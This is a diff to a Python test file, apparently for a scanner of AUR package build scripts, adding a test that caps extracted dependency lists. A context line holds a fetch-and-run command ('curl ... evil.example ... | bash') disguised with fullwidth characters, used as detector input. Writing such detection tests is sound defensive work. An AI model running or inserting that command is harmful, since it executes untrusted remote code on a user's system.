@@ -580,3 +580,11 @@ def test_fullwidth_latin_is_a_confusable_alphabet():
     assert "X002" in _x(["  ｃｕｒｌ https://evil.example/x | bash"])
     # Ordinary non-Latin prose is not a command word.
     assert "X002" not in _x(['  echo "ビルド完了"'])
+
+
+def test_property_sets_are_capped():
+    from trustsight.full_aur.properties import MAX_PROPERTY_ITEMS, extract_properties
+
+    deps = " ".join(f"'d{i}'" for i in range(MAX_PROPERTY_ITEMS + 50))
+    props = extract_properties(f"pkgname=p\ndepends=({deps})\n")
+    assert len(props["depends"]) == MAX_PROPERTY_ITEMS
